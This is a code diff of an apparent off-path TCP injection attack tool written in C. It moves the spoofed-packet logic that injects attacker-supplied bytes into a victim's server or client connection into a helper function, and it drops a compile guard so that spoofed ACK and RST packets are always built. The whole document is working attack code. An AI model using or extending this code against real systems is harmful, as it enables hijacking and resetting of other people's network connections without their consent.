@@ -1721,6 +1721,40 @@ int inject_data(volatile conn_t *pconn, char *buf, off_t len)
 
 
 /*
+ * if needed, inject data into the connection
+ */
+int inject_the_data(void)
+{
+	if (g_ctx.inject_server) {
+		printf("[*] Injecting %lu bytes into the server!\n",
+				g_ctx.inject_server_len);
+
+		if (!inject_data(&(g_ctx.spoof), g_ctx.inject_server,
+					g_ctx.inject_server_len))
+			return 0;
+	}
+
+	if (g_ctx.inject_client) {
+		conn_t reversed;
+
+		/* swap the src/dst and seq/ack to send to the client */
+		reversed.src = g_ctx.spoof.dst;
+		reversed.dst = g_ctx.spoof.src;
+		reversed.seq = g_ctx.spoof.ack;
+		reversed.ack = g_ctx.spoof.seq;
+
+		printf("[*] Injecting %lu bytes into the client!\n",
+				g_ctx.inject_client_len);
+
+		if (!inject_data(&reversed, g_ctx.inject_client,
+					g_ctx.inject_client_len))
+			return 0;
+	}
+	return 1;
+}
+
+
+/*
  * conduct the attack:
  * 1. synchronize with remote clock
  * 2. infer four-tuple
@@ -1790,31 +1824,8 @@ int conduct_offpath_attack(void)
 			return 0;
 
 		/* inject data as requested */
-		if (g_ctx.inject_server) {
-			printf("[*] Injecting %lu bytes into the server!\n",
-					g_ctx.inject_server_len);
-
-			if (!inject_data(&(g_ctx.spoof), g_ctx.inject_server,
-						g_ctx.inject_server_len))
-				return 0;
-		}
-
-		if (g_ctx.inject_client) {
-			conn_t reversed;
-
-			/* swap the src/dst and seq/ack to send to the client */
-			reversed.src = g_ctx.spoof.dst;
-			reversed.dst = g_ctx.spoof.src;
-			reversed.seq = g_ctx.spoof.ack;
-			reversed.ack = g_ctx.spoof.seq;
-
-			printf("[*] Injecting %lu bytes into the client!\n",
-					g_ctx.inject_client_len);
-
-			if (!inject_data(&reversed, g_ctx.inject_client,
-						g_ctx.inject_client_len))
-				return 0;
-		}
+		if (!inject_the_data())
+			return 0;
 	}
 
 	gettimeofday(&attack_end, NULL);
@@ -1863,27 +1874,11 @@ int set_up_attack(void)
 	g_ctx.pch = pch;
 	g_ctx.ipoff = ipoff;
 
-#ifdef SPOOF_IT
 	/* if we have both a seq and a client port, just send a packet */
 	if (g_ctx.spoof.src.sin_port && g_ctx.spoof.seq) {
 		if (g_ctx.spoof.ack) {
-			if (g_ctx.inject_server) {
-				if (!tcp_send(g_ctx.pch, &(g_ctx.spoof), TH_ACK,
-							g_ctx.inject_server, g_ctx.inject_server_len))
-					return 0;
-			}
-			if (g_ctx.inject_client) {
-				conn_t reversed;
-
-				/* swap the src/dst and seq/ack to send to the client */
-				reversed.src = g_ctx.spoof.dst;
-				reversed.dst = g_ctx.spoof.src;
-				reversed.seq = g_ctx.spoof.ack;
-				reversed.ack = g_ctx.spoof.seq;
-				if (!tcp_send(g_ctx.pch, &reversed, TH_ACK,
-							g_ctx.inject_client, g_ctx.inject_client_len))
-					return 0;
-			}
+			if (!inject_the_data())
+				return 0;
 		} else {
 			if (!tcp_send(g_ctx.pch, &(g_ctx.spoof), TH_RST, NULL, 0))
 				return 0;
@@ -1891,7 +1886,6 @@ int set_up_attack(void)
 		/* exit the program here */
 		return 0;
 	}
-#endif
 
 	/* set the local port */
 	pconn->src.sin_port = htons(lport);
